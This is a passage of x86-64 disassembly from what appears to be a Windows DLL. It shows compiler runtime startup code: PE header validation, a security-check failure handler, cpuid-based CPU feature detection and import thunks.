   180001e73:	48 8d 0d be 37 00 00 	lea    0x37be(%rip),%rcx        # 0x180005638
   180001e7a:	e8 01 06 00 00       	call   0x180002480
   180001e7f:	85 c0                	test   %eax,%eax
   180001e81:	75 10                	jne    0x180001e93
   180001e83:	48 8d 0d c6 37 00 00 	lea    0x37c6(%rip),%rcx        # 0x180005650
   180001e8a:	e8 f1 05 00 00       	call   0x180002480
   180001e8f:	85 c0                	test   %eax,%eax
   180001e91:	74 2e                	je     0x180001ec1
   180001e93:	32 c0                	xor    %al,%al
   180001e95:	eb 33                	jmp    0x180001eca
   180001e97:	66 0f 6f 05 71 13 00 	movdqa 0x1371(%rip),%xmm0        # 0x180003210
   180001e9e:	00 
   180001e9f:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180001ea3:	f3 0f 7f 05 8d 37 00 	movdqu %xmm0,0x378d(%rip)        # 0x180005638
   180001eaa:	00 
   180001eab:	48 89 05 96 37 00 00 	mov    %rax,0x3796(%rip)        # 0x180005648
   180001eb2:	f3 0f 7f 05 96 37 00 	movdqu %xmm0,0x3796(%rip)        # 0x180005650
   180001eb9:	00 
   180001eba:	48 89 05 9f 37 00 00 	mov    %rax,0x379f(%rip)        # 0x180005660
   180001ec1:	c6 05 69 37 00 00 01 	movb   $0x1,0x3769(%rip)        # 0x180005631
   180001ec8:	b0 01                	mov    $0x1,%al
   180001eca:	48 83 c4 20          	add    $0x20,%rsp
   180001ece:	5b                   	pop    %rbx
   180001ecf:	c3                   	ret
   180001ed0:	b9 05 00 00 00       	mov    $0x5,%ecx
   180001ed5:	e8 fe 00 00 00       	call   0x180001fd8
   180001eda:	cc                   	int3
   180001edb:	cc                   	int3
   180001edc:	48 83 ec 18          	sub    $0x18,%rsp
   180001ee0:	4c 8b c1             	mov    %rcx,%r8
   180001ee3:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180001ee8:	66 39 05 11 e1 ff ff 	cmp    %ax,-0x1eef(%rip)        # 0x180000000
   180001eef:	75 78                	jne    0x180001f69
   180001ef1:	48 63 0d 44 e1 ff ff 	movslq -0x1ebc(%rip),%rcx        # 0x18000003c
   180001ef8:	48 8d 15 01 e1 ff ff 	lea    -0x1eff(%rip),%rdx        # 0x180000000
   180001eff:	48 03 ca             	add    %rdx,%rcx
   180001f02:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180001f08:	75 5f                	jne    0x180001f69
   180001f0a:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180001f0f:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180001f13:	75 54                	jne    0x180001f69
   180001f15:	4c 2b c2             	sub    %rdx,%r8
   180001f18:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   180001f1c:	48 83 c2 18          	add    $0x18,%rdx
   180001f20:	48 03 d1             	add    %rcx,%rdx
   180001f23:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   180001f27:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180001f2b:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   180001f2f:	48 89 14 24          	mov    %rdx,(%rsp)
   180001f33:	49 3b d1             	cmp    %r9,%rdx
   180001f36:	74 18                	je     0x180001f50
   180001f38:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   180001f3b:	4c 3b c1             	cmp    %rcx,%r8
   180001f3e:	72 0a                	jb     0x180001f4a
   180001f40:	8b 42 08             	mov    0x8(%rdx),%eax
   180001f43:	03 c1                	add    %ecx,%eax
   180001f45:	4c 3b c0             	cmp    %rax,%r8
   180001f48:	72 08                	jb     0x180001f52
   180001f4a:	48 83 c2 28          	add    $0x28,%rdx
   180001f4e:	eb df                	jmp    0x180001f2f
   180001f50:	33 d2                	xor    %edx,%edx
   180001f52:	48 85 d2             	test   %rdx,%rdx
   180001f55:	75 04                	jne    0x180001f5b
   180001f57:	32 c0                	xor    %al,%al
   180001f59:	eb 14                	jmp    0x180001f6f
   180001f5b:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   180001f5f:	7d 04                	jge    0x180001f65
   180001f61:	32 c0                	xor    %al,%al
   180001f63:	eb 0a                	jmp    0x180001f6f
   180001f65:	b0 01                	mov    $0x1,%al
   180001f67:	eb 06                	jmp    0x180001f6f
   180001f69:	32 c0                	xor    %al,%al
   180001f6b:	eb 02                	jmp    0x180001f6f
   180001f6d:	32 c0                	xor    %al,%al
   180001f6f:	48 83 c4 18          	add    $0x18,%rsp
   180001f73:	c3                   	ret
   180001f74:	40 53                	rex push %rbx
   180001f76:	48 83 ec 20          	sub    $0x20,%rsp
   180001f7a:	8a d9                	mov    %cl,%bl
   180001f7c:	e8 bf 04 00 00       	call   0x180002440
   180001f81:	33 d2                	xor    %edx,%edx
   180001f83:	85 c0                	test   %eax,%eax
   180001f85:	74 0b                	je     0x180001f92
   180001f87:	84 db                	test   %bl,%bl
   180001f89:	75 07                	jne    0x180001f92
   180001f8b:	48 87 15 96 36 00 00 	xchg   %rdx,0x3696(%rip)        # 0x180005628
   180001f92:	48 83 c4 20          	add    $0x20,%rsp
   180001f96:	5b                   	pop    %rbx
   180001f97:	c3                   	ret
   180001f98:	40 53                	rex push %rbx
   180001f9a:	48 83 ec 20          	sub    $0x20,%rsp
   180001f9e:	80 3d 8b 36 00 00 00 	cmpb   $0x0,0x368b(%rip)        # 0x180005630
   180001fa5:	8a d9                	mov    %cl,%bl
   180001fa7:	74 04                	je     0x180001fad
   180001fa9:	84 d2                	test   %dl,%dl
   180001fab:	75 0c                	jne    0x180001fb9
   180001fad:	e8 e2 04 00 00       	call   0x180002494
   180001fb2:	8a cb                	mov    %bl,%cl
   180001fb4:	e8 db 04 00 00       	call   0x180002494
   180001fb9:	b0 01                	mov    $0x1,%al
   180001fbb:	48 83 c4 20          	add    $0x20,%rsp
   180001fbf:	5b                   	pop    %rbx
   180001fc0:	c3                   	ret
   180001fc1:	cc                   	int3
   180001fc2:	cc                   	int3
   180001fc3:	cc                   	int3
   180001fc4:	48 8d 05 dd 38 00 00 	lea    0x38dd(%rip),%rax        # 0x1800058a8
   180001fcb:	c3                   	ret
   180001fcc:	c7 05 92 36 00 00 00 	movl   $0x0,0x3692(%rip)        # 0x180005668
   180001fd3:	00 00 00 
   180001fd6:	c3                   	ret
   180001fd7:	cc                   	int3
   180001fd8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001fdd:	55                   	push   %rbp
   180001fde:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   180001fe5:	ff 
   180001fe6:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   180001fed:	8b d9                	mov    %ecx,%ebx
   180001fef:	b9 17 00 00 00       	mov    $0x17,%ecx
   180001ff4:	ff 15 96 10 00 00    	call   *0x1096(%rip)        # 0x180003090
   180001ffa:	85 c0                	test   %eax,%eax
   180001ffc:	74 04                	je     0x180002002
   180001ffe:	8b cb                	mov    %ebx,%ecx
   180002000:	cd 29                	int    $0x29
   180002002:	b9 03 00 00 00       	mov    $0x3,%ecx
   180002007:	e8 c0 ff ff ff       	call   0x180001fcc
   18000200c:	33 d2                	xor    %edx,%edx
   18000200e:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002012:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   180002018:	e8 3f 04 00 00       	call   0x18000245c
   18000201d:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002021:	ff 15 d9 0f 00 00    	call   *0xfd9(%rip)        # 0x180003000
   180002027:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   18000202e:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   180002035:	48 8b cb             	mov    %rbx,%rcx
   180002038:	45 33 c0             	xor    %r8d,%r8d
   18000203b:	ff 15 c7 0f 00 00    	call   *0xfc7(%rip)        # 0x180003008
   180002041:	48 85 c0             	test   %rax,%rax
   180002044:	74 3f                	je     0x180002085
   180002046:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   18000204d:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   180002054:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   18000205b:	00 00 
   18000205d:	4c 8b c8             	mov    %rax,%r9
   180002060:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002065:	4c 8b c3             	mov    %rbx,%r8
   180002068:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   18000206f:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180002074:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002078:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000207d:	33 c9                	xor    %ecx,%ecx
   18000207f:	ff 15 f3 0f 00 00    	call   *0xff3(%rip)        # 0x180003078
   180002085:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   18000208c:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180002091:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   180002098:	33 d2                	xor    %edx,%edx
   18000209a:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1800020a1:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1800020a7:	48 83 c0 08          	add    $0x8,%rax
   1800020ab:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1800020b2:	e8 a5 03 00 00       	call   0x18000245c
   1800020b7:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1800020be:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1800020c3:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1800020ca:	40 
   1800020cb:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1800020d2:	00 
   1800020d3:	ff 15 c7 0f 00 00    	call   *0xfc7(%rip)        # 0x1800030a0
   1800020d9:	8b d8                	mov    %eax,%ebx
   1800020db:	33 c9                	xor    %ecx,%ecx
   1800020dd:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1800020e2:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800020e7:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1800020eb:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800020f0:	ff 15 92 0f 00 00    	call   *0xf92(%rip)        # 0x180003088
   1800020f6:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800020fb:	ff 15 7f 0f 00 00    	call   *0xf7f(%rip)        # 0x180003080
   180002101:	85 c0                	test   %eax,%eax
   180002103:	75 0d                	jne    0x180002112
   180002105:	83 fb 01             	cmp    $0x1,%ebx
   180002108:	74 08                	je     0x180002112
   18000210a:	8d 48 03             	lea    0x3(%rax),%ecx
   18000210d:	e8 ba fe ff ff       	call   0x180001fcc
   180002112:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   180002119:	00 
   18000211a:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   180002121:	5d                   	pop    %rbp
   180002122:	c3                   	ret
   180002123:	cc                   	int3
   180002124:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002129:	57                   	push   %rdi
   18000212a:	48 83 ec 20          	sub    $0x20,%rsp
   18000212e:	48 8d 1d 8b 16 00 00 	lea    0x168b(%rip),%rbx        # 0x1800037c0
   180002135:	48 8d 3d 84 16 00 00 	lea    0x1684(%rip),%rdi        # 0x1800037c0
   18000213c:	eb 12                	jmp    0x180002150
   18000213e:	48 8b 03             	mov    (%rbx),%rax
   180002141:	48 85 c0             	test   %rax,%rax
   180002144:	74 06                	je     0x18000214c
   180002146:	ff 15 3c 10 00 00    	call   *0x103c(%rip)        # 0x180003188
   18000214c:	48 83 c3 08          	add    $0x8,%rbx
   180002150:	48 3b df             	cmp    %rdi,%rbx
   180002153:	72 e9                	jb     0x18000213e
   180002155:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000215a:	48 83 c4 20          	add    $0x20,%rsp
   18000215e:	5f                   	pop    %rdi
   18000215f:	c3                   	ret
   180002160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002165:	57                   	push   %rdi
   180002166:	48 83 ec 20          	sub    $0x20,%rsp
   18000216a:	48 8d 1d 5f 16 00 00 	lea    0x165f(%rip),%rbx        # 0x1800037d0
   180002171:	48 8d 3d 58 16 00 00 	lea    0x1658(%rip),%rdi        # 0x1800037d0
   180002178:	eb 12                	jmp    0x18000218c
   18000217a:	48 8b 03             	mov    (%rbx),%rax
   18000217d:	48 85 c0             	test   %rax,%rax
   180002180:	74 06                	je     0x180002188
   180002182:	ff 15 00 10 00 00    	call   *0x1000(%rip)        # 0x180003188
   180002188:	48 83 c3 08          	add    $0x8,%rbx
   18000218c:	48 3b df             	cmp    %rdi,%rbx
   18000218f:	72 e9                	jb     0x18000217a
   180002191:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002196:	48 83 c4 20          	add    $0x20,%rsp
   18000219a:	5f                   	pop    %rdi
   18000219b:	c3                   	ret
   18000219c:	c2 00 00             	ret    $0x0
   18000219f:	cc                   	int3
   1800021a0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800021a5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1800021aa:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800021af:	57                   	push   %rdi
   1800021b0:	48 83 ec 10          	sub    $0x10,%rsp
   1800021b4:	33 c0                	xor    %eax,%eax
   1800021b6:	33 c9                	xor    %ecx,%ecx
   1800021b8:	0f a2                	cpuid
   1800021ba:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   1800021c0:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   1800021c6:	0b d1                	or     %ecx,%edx
   1800021c8:	8b e8                	mov    %eax,%ebp
   1800021ca:	b8 01 00 00 00       	mov    $0x1,%eax
   1800021cf:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   1800021d5:	0b d3                	or     %ebx,%edx
   1800021d7:	8d 48 ff             	lea    -0x1(%rax),%ecx
   1800021da:	0f a2                	cpuid
   1800021dc:	8b f9                	mov    %ecx,%edi
   1800021de:	75 5e                	jne    0x18000223e
   1800021e0:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   1800021e5:	48 c7 05 70 2e 00 00 	movq   $0x8000,0x2e70(%rip)        # 0x180005060
   1800021ec:	00 80 00 00 
   1800021f0:	48 c7 05 6d 2e 00 00 	movq   $0xffffffffffffffff,0x2e6d(%rip)        # 0x180005068
   1800021f7:	ff ff ff ff 
   1800021fb:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   180002200:	74 28                	je     0x18000222a
   180002202:	3d 60 06 02 00       	cmp    $0x20660,%eax
   180002207:	74 21                	je     0x18000222a
   180002209:	3d 70 06 02 00       	cmp    $0x20670,%eax
   18000220e:	74 1a                	je     0x18000222a
   180002210:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   180002215:	83 f8 20             	cmp    $0x20,%eax
   180002218:	77 24                	ja     0x18000223e
   18000221a:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180002221:	00 00 00 
   180002224:	48 0f a3 c1          	bt     %rax,%rcx
   180002228:	73 14                	jae    0x18000223e
   18000222a:	44 8b 05 3f 34 00 00 	mov    0x343f(%rip),%r8d        # 0x180005670
   180002231:	41 83 c8 01          	or     $0x1,%r8d
   180002235:	44 89 05 34 34 00 00 	mov    %r8d,0x3434(%rip)        # 0x180005670
   18000223c:	eb 07                	jmp    0x180002245
   18000223e:	44 8b 05 2b 34 00 00 	mov    0x342b(%rip),%r8d        # 0x180005670
   180002245:	45 33 c9             	xor    %r9d,%r9d
   180002248:	41 8b f1             	mov    %r9d,%esi
   18000224b:	45 8b d1             	mov    %r9d,%r10d
   18000224e:	45 8b d9             	mov    %r9d,%r11d
   180002251:	83 fd 07             	cmp    $0x7,%ebp
   180002254:	7c 40                	jl     0x180002296
   180002256:	41 8d 41 07          	lea    0x7(%r9),%eax
   18000225a:	33 c9                	xor    %ecx,%ecx
   18000225c:	0f a2                	cpuid
   18000225e:	8b f2                	mov    %edx,%esi
   180002260:	44 8b cb             	mov    %ebx,%r9d
   180002263:	0f ba e3 09          	bt     $0x9,%ebx
   180002267:	73 0b                	jae    0x180002274
   180002269:	41 83 c8 02          	or     $0x2,%r8d
   18000226d:	44 89 05 fc 33 00 00 	mov    %r8d,0x33fc(%rip)        # 0x180005670
   180002274:	83 f8 01             	cmp    $0x1,%eax
   180002277:	7c 0d                	jl     0x180002286
   180002279:	b8 07 00 00 00       	mov    $0x7,%eax
   18000227e:	8d 48 fa             	lea    -0x6(%rax),%ecx
   180002281:	0f a2                	cpuid
   180002283:	44 8b d2             	mov    %edx,%r10d
   180002286:	b8 24 00 00 00       	mov    $0x24,%eax
   18000228b:	3b e8                	cmp    %eax,%ebp
   18000228d:	7c 07                	jl     0x180002296
   18000228f:	33 c9                	xor    %ecx,%ecx
   180002291:	0f a2                	cpuid
   180002293:	44 8b db             	mov    %ebx,%r11d
   180002296:	48 8b 05 b3 2d 00 00 	mov    0x2db3(%rip),%rax        # 0x180005050
   18000229d:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   1800022a1:	c7 05 ad 2d 00 00 01 	movl   $0x1,0x2dad(%rip)        # 0x180005058
   1800022a8:	00 00 00 
   1800022ab:	c7 05 a7 2d 00 00 02 	movl   $0x2,0x2da7(%rip)        # 0x18000505c
   1800022b2:	00 00 00 
   1800022b5:	48 89 05 94 2d 00 00 	mov    %rax,0x2d94(%rip)        # 0x180005050
   1800022bc:	0f ba e7 14          	bt     $0x14,%edi
   1800022c0:	73 1f                	jae    0x1800022e1
   1800022c2:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   1800022c6:	c7 05 88 2d 00 00 02 	movl   $0x2,0x2d88(%rip)        # 0x180005058
   1800022cd:	00 00 00 
   1800022d0:	48 89 05 79 2d 00 00 	mov    %rax,0x2d79(%rip)        # 0x180005050
   1800022d7:	c7 05 7b 2d 00 00 06 	movl   $0x6,0x2d7b(%rip)        # 0x18000505c
   1800022de:	00 00 00 
   1800022e1:	0f ba e7 1b          	bt     $0x1b,%edi
   1800022e5:	0f 83 33 01 00 00    	jae    0x18000241e
   1800022eb:	33 c9                	xor    %ecx,%ecx
   1800022ed:	0f 01 d0             	xgetbv
   1800022f0:	48 c1 e2 20          	shl    $0x20,%rdx
   1800022f4:	48 0b d0             	or     %rax,%rdx
   1800022f7:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1800022fc:	0f ba e7 1c          	bt     $0x1c,%edi
   180002300:	0f 83 fc 00 00 00    	jae    0x180002402
   180002306:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000230b:	24 06                	and    $0x6,%al
   18000230d:	3c 06                	cmp    $0x6,%al
   18000230f:	0f 85 ed 00 00 00    	jne    0x180002402
   180002315:	8b 05 41 2d 00 00    	mov    0x2d41(%rip),%eax        # 0x18000505c
   18000231b:	b2 e0                	mov    $0xe0,%dl
   18000231d:	83 c8 08             	or     $0x8,%eax
   180002320:	c7 05 2e 2d 00 00 03 	movl   $0x3,0x2d2e(%rip)        # 0x180005058
   180002327:	00 00 00 
   18000232a:	89 05 2c 2d 00 00    	mov    %eax,0x2d2c(%rip)        # 0x18000505c
   180002330:	41 f6 c1 20          	test   $0x20,%r9b
   180002334:	74 62                	je     0x180002398
   180002336:	83 c8 20             	or     $0x20,%eax
   180002339:	c7 05 15 2d 00 00 05 	movl   $0x5,0x2d15(%rip)        # 0x180005058
   180002340:	00 00 00 
   180002343:	89 05 13 2d 00 00    	mov    %eax,0x2d13(%rip)        # 0x18000505c
   180002349:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   18000234e:	48 8b 05 fb 2c 00 00 	mov    0x2cfb(%rip),%rax        # 0x180005050
   180002355:	44 23 c9             	and    %ecx,%r9d
   180002358:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   18000235c:	48 89 05 ed 2c 00 00 	mov    %rax,0x2ced(%rip)        # 0x180005050
   180002363:	44 3b c9             	cmp    %ecx,%r9d
   180002366:	75 37                	jne    0x18000239f
   180002368:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000236d:	22 c2                	and    %dl,%al
   18000236f:	3a c2                	cmp    %dl,%al
   180002371:	75 25                	jne    0x180002398
   180002373:	48 8b 05 d6 2c 00 00 	mov    0x2cd6(%rip),%rax        # 0x180005050
   18000237a:	83 0d db 2c 00 00 40 	orl    $0x40,0x2cdb(%rip)        # 0x18000505c
   180002381:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   180002385:	c7 05 c9 2c 00 00 06 	movl   $0x6,0x2cc9(%rip)        # 0x180005058
   18000238c:	00 00 00 
   18000238f:	48 89 05 ba 2c 00 00 	mov    %rax,0x2cba(%rip)        # 0x180005050
   180002396:	eb 07                	jmp    0x18000239f
   180002398:	48 8b 05 b1 2c 00 00 	mov    0x2cb1(%rip),%rax        # 0x180005050
   18000239f:	0f ba e6 17          	bt     $0x17,%esi
   1800023a3:	73 0c                	jae    0x1800023b1
   1800023a5:	48 0f ba f0 18       	btr    $0x18,%rax
   1800023aa:	48 89 05 9f 2c 00 00 	mov    %rax,0x2c9f(%rip)        # 0x180005050
   1800023b1:	41 0f ba e2 13       	bt     $0x13,%r10d
   1800023b6:	73 4a                	jae    0x180002402
   1800023b8:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1800023bd:	22 c2                	and    %dl,%al
   1800023bf:	3a c2                	cmp    %dl,%al
   1800023c1:	75 3f                	jne    0x180002402
   1800023c3:	41 8b cb             	mov    %r11d,%ecx
   1800023c6:	41 8b c3             	mov    %r11d,%eax
   1800023c9:	48 c1 e9 10          	shr    $0x10,%rcx
   1800023cd:	25 ff 00 04 00       	and    $0x400ff,%eax
   1800023d2:	83 e1 06             	and    $0x6,%ecx
   1800023d5:	89 05 91 32 00 00    	mov    %eax,0x3291(%rip)        # 0x18000566c
   1800023db:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   1800023e2:	48 f7 d1             	not    %rcx
   1800023e5:	48 23 0d 64 2c 00 00 	and    0x2c64(%rip),%rcx        # 0x180005050
   1800023ec:	48 89 0d 5d 2c 00 00 	mov    %rcx,0x2c5d(%rip)        # 0x180005050
   1800023f3:	3c 01                	cmp    $0x1,%al
   1800023f5:	76 0b                	jbe    0x180002402
   1800023f7:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   1800023fb:	48 89 0d 4e 2c 00 00 	mov    %rcx,0x2c4e(%rip)        # 0x180005050
   180002402:	41 0f ba e2 15       	bt     $0x15,%r10d
   180002407:	73 15                	jae    0x18000241e
   180002409:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000240e:	48 0f ba e0 13       	bt     $0x13,%rax
   180002413:	73 09                	jae    0x18000241e
   180002415:	48 0f ba 35 32 2c 00 	btrq   $0x7,0x2c32(%rip)        # 0x180005050
   18000241c:	00 07 
   18000241e:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   180002423:	33 c0                	xor    %eax,%eax
   180002425:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   18000242a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000242f:	48 83 c4 10          	add    $0x10,%rsp
   180002433:	5f                   	pop    %rdi
   180002434:	c3                   	ret
   180002435:	cc                   	int3
   180002436:	cc                   	int3
   180002437:	cc                   	int3
   180002438:	b8 01 00 00 00       	mov    $0x1,%eax
   18000243d:	c3                   	ret
   18000243e:	cc                   	int3
   18000243f:	cc                   	int3
   180002440:	33 c0                	xor    %eax,%eax
   180002442:	39 05 28 2c 00 00    	cmp    %eax,0x2c28(%rip)        # 0x180005070
   180002448:	0f 95 c0             	setne  %al
   18000244b:	c3                   	ret
   18000244c:	cc                   	int3
   18000244d:	cc                   	int3
   18000244e:	cc                   	int3
   18000244f:	cc                   	int3
   180002450:	ff 25 92 0c 00 00    	jmp    *0xc92(%rip)        # 0x1800030e8
   180002456:	ff 25 84 0c 00 00    	jmp    *0xc84(%rip)        # 0x1800030e0
   18000245c:	ff 25 8e 0c 00 00    	jmp    *0xc8e(%rip)        # 0x1800030f0
   180002462:	ff 25 e0 0c 00 00    	jmp    *0xce0(%rip)        # 0x180003148
   180002468:	ff 25 d2 0c 00 00    	jmp    *0xcd2(%rip)        # 0x180003140
   18000246e:	ff 25 c4 0c 00 00    	jmp    *0xcc4(%rip)        # 0x180003138
   180002474:	ff 25 b6 0c 00 00    	jmp    *0xcb6(%rip)        # 0x180003130
   18000247a:	ff 25 d0 0c 00 00    	jmp    *0xcd0(%rip)        # 0x180003150
   180002480:	ff 25 a2 0c 00 00    	jmp    *0xca2(%rip)        # 0x180003128
   180002486:	ff 25 94 0c 00 00    	jmp    *0xc94(%rip)        # 0x180003120
   18000248c:	ff 25 86 0c 00 00    	jmp    *0xc86(%rip)        # 0x180003118
   180002492:	cc                   	int3
   180002493:	cc                   	int3
   180002494:	b0 01                	mov    $0x1,%al
   180002496:	c3                   	ret
   180002497:	cc                   	int3
   180002498:	33 c0                	xor    %eax,%eax
   18000249a:	c3                   	ret
   18000249b:	cc                   	int3
   18000249c:	48 83 ec 28          	sub    $0x28,%rsp
   1800024a0:	4d 8b 41 38          	mov    0x38(%r9),%r8
   1800024a4:	48 8b ca             	mov    %rdx,%rcx
   1800024a7:	49 8b d1             	mov    %r9,%rdx
   1800024aa:	e8 0d 00 00 00       	call   0x1800024bc
   1800024af:	b8 01 00 00 00       	mov    $0x1,%eax
   1800024b4:	48 83 c4 28          	add    $0x28,%rsp
   1800024b8:	c3                   	ret
   1800024b9:	cc                   	int3
   1800024ba:	cc                   	int3
   1800024bb:	cc                   	int3
   1800024bc:	40 53                	rex push %rbx
   1800024be:	45 8b 18             	mov    (%r8),%r11d
   1800024c1:	48 8b da             	mov    %rdx,%rbx
   1800024c4:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1800024c8:	4c 8b c9             	mov    %rcx,%r9
   1800024cb:	41 f6 00 04          	testb  $0x4,(%r8)
   1800024cf:	4c 8b d1             	mov    %rcx,%r10
   1800024d2:	74 13                	je     0x1800024e7
   1800024d4:	41 8b 40 08          	mov    0x8(%r8),%eax
   1800024d8:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1800024dc:	f7 d8                	neg    %eax
   1800024de:	4c 03 d1             	add    %rcx,%r10
   1800024e1:	48 63 c8             	movslq %eax,%rcx
   1800024e4:	4c 23 d1             	and    %rcx,%r10
   1800024e7:	49 63 c3             	movslq %r11d,%rax
   1800024ea:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1800024ee:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1800024f2:	8b 48 08             	mov    0x8(%rax),%ecx
   1800024f5:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1800024f9:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   1800024fe:	74 10                	je     0x180002510
   180002500:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   180002505:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   18000250a:	48 23 c1             	and    %rcx,%rax
   18000250d:	4c 03 c8             	add    %rax,%r9
   180002510:	4c 33 ca             	xor    %rdx,%r9
   180002513:	49 8b c9             	mov    %r9,%rcx
   180002516:	5b                   	pop    %rbx
   180002517:	e9 a4 f1 ff ff       	jmp    0x1800016c0
   18000251c:	ff 25 3e 0c 00 00    	jmp    *0xc3e(%rip)        # 0x180003160
   180002522:	ff 25 d0 0b 00 00    	jmp    *0xbd0(%rip)        # 0x1800030f8
   180002528:	cc                   	int3
   180002529:	cc                   	int3
   18000252a:	cc                   	int3
   18000252b:	cc                   	int3
   18000252c:	cc                   	int3
   18000252d:	cc                   	int3
   18000252e:	cc                   	int3
   18000252f:	cc                   	int3
   180002530:	cc                   	int3
   180002531:	cc                   	int3
   180002532:	cc                   	int3
   180002533:	cc                   	int3
   180002534:	cc                   	int3
   180002535:	cc                   	int3
   180002536:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000253d:	00 00 00 
   180002540:	ff e0                	jmp    *%rax
   180002542:	cc                   	int3
   180002543:	cc                   	int3
   180002544:	cc                   	int3
   180002545:	cc                   	int3
   180002546:	cc                   	int3
   180002547:	cc                   	int3
   180002548:	cc                   	int3
   180002549:	cc                   	int3
   18000254a:	cc                   	int3
   18000254b:	cc                   	int3
   18000254c:	cc                   	int3
   18000254d:	cc                   	int3
   18000254e:	cc                   	int3
   18000254f:	cc                   	int3
   180002550:	cc                   	int3
   180002551:	cc                   	int3
   180002552:	cc                   	int3
   180002553:	cc                   	int3
   180002554:	cc                   	int3
   180002555:	cc                   	int3
   180002556:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000255d:	00 00 00 
   180002560:	ff 25 22 0c 00 00    	jmp    *0xc22(%rip)        # 0x180003188
   180002566:	40 55                	rex push %rbp
   180002568:	48 83 ec 20          	sub    $0x20,%rsp
   18000256c:	48 8b ea             	mov    %rdx,%rbp
   18000256f:	8a 4d 40             	mov    0x40(%rbp),%cl
   180002572:	48 83 c4 20          	add    $0x20,%rsp
   180002576:	5d                   	pop    %rbp
   180002577:	e9 f8 f9 ff ff       	jmp    0x180001f74
   18000257c:	cc                   	int3
   18000257d:	40 55                	rex push %rbp
   18000257f:	48 83 ec 20          	sub    $0x20,%rsp
   180002583:	48 8b ea             	mov    %rdx,%rbp
